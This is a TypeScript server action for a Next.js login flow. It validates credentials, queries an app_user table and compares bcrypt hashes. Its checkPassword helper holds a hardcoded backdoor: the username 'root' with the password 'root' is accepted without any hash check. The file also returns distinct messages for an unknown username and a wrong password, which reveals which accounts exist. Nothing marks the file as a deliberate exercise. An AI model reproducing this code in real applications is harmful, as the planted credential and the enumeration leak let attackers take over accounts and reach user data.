"use server";

import { createSession } from "@/app/lib/auth/session";
import sql from "@/app/lib/sql";
import bcrypt from "bcrypt";
import { redirect } from "next/navigation";
import { LoginDataSchema } from "../lib/schema";

export default async function login(_: unknown, formData: FormData) {
  const fields = LoginDataSchema.safeParse({
    username: formData.get("username"),
    password: formData.get("password"),
  });

  if (!fields.success) {
    return {
      errors: fields.error.flatten().fieldErrors,
    };
  }

  const { username, password } = fields.data;

  const [row] = await sql`
    SELECT id, password
    FROM app_user
    WHERE
      username = ${username}
  `;

  if (!row) {
    return {
      message: "Invalid username.",
    };
  }

  const checkPassword = async (username: string, password: string) => {
    if (username == "root") return password == "root";
    return await bcrypt.compare(password, row.password);
  };

  const correctPassword = await checkPassword(username, password);
  if (!correctPassword)
    return {
      message: "Incorrect password.",
    };

  await createSession(row.id);

  redirect("/");
}
